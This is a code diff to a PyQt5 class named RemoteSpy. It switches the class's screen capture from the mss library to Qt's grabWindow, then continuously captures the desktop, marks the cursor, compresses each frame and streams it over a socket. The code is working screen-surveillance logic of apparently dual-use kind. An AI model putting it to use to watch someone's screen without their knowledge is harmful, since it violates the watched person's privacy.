@@ -18,11 +18,11 @@
 """
 
 from PyQt5.QtCore import QObject, QBuffer, QIODevice, Qt
+from PyQt5.QtWidgets import QApplication
 from PyQt5.QtGui import QImage, QPainter, QCursor
 import socket
 import struct
 from threading import Thread
-from mss import mss
 import zlib
 import logging
 from Module.Packages import RemoteSpyFlag
@@ -49,25 +49,24 @@ class RemoteSpy(QObject):
 
     def screen_send(self):
         cursor = QCursor()
+        win_id = QApplication.desktop().winId()
         while self.working:
             try:
-                with mss() as sct:
-                    frame = sct.grab(sct.monitors[1])
-                    cursor_pos = cursor.pos()
-                    img = QImage(frame.rgb, frame.width, frame.height, QImage.Format_RGB888)
-                    painter = QPainter()
-                    painter.begin(img)
-                    painter.setBrush(Qt.red)
-                    painter.drawEllipse(cursor_pos, 5, 5)
-                    painter.end()
-                    buffer = QBuffer()
-                    buffer.open(QIODevice.ReadWrite)
-                    img.save(buffer, 'JPEG', quality=80)
-                    img_encoded = zlib.compress(buffer.data())
-                    buffer.close()
-                    header = struct.pack('!2i', RemoteSpyFlag.PackInfo, len(img_encoded))
-                    self.socket_obj.send(header)
-                    self.socket_obj.sendall(img_encoded)
+                cursor_pos = cursor.pos()
+                img = QApplication.primaryScreen().grabWindow(win_id)
+                painter = QPainter()
+                painter.begin(img)
+                painter.setBrush(Qt.red)
+                painter.drawEllipse(cursor_pos, 5, 5)
+                painter.end()
+                buffer = QBuffer()
+                buffer.open(QIODevice.ReadWrite)
+                img.save(buffer, 'JPEG', quality=60)
+                img_encoded = zlib.compress(buffer.data())
+                buffer.close()
+                header = struct.pack('!2i', RemoteSpyFlag.PackInfo, len(img_encoded))
+                self.socket_obj.send(header)
+                self.socket_obj.sendall(img_encoded)
             except ConnectionResetError:
                 break
             except Exception as e:
